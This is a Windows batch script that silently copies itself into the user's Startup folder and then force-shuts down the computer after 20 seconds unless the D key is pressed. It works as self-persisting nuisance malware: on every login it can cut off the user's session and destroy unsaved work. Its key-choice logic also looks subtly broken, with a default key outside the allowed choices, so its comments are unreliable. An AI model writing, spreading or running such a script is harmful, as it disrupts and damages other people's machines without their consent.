@echo off
:: Silent copy to startup
set USERNAME=%USERNAME%
set STARTUP_FOLDER=C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
copy "%~f0" "%STARTUP_FOLDER%\shutdown_with_key_cancel.bat" /Y >nul 2>nul

:: Informational (optional)
echo System will shutdown in 20 seconds. Press D to cancel.

:: Wait 20 seconds for key press (D to cancel)
choice /c D /n /t 20 /d N >nul

:: Check if D was pressed
if errorlevel 1 (
    :: D was pressed -> cancel shutdown
    echo Shutdown canceled.
    exit
)

:: If D was not pressed -> shutdown silently
shutdown /s /t 0 /f
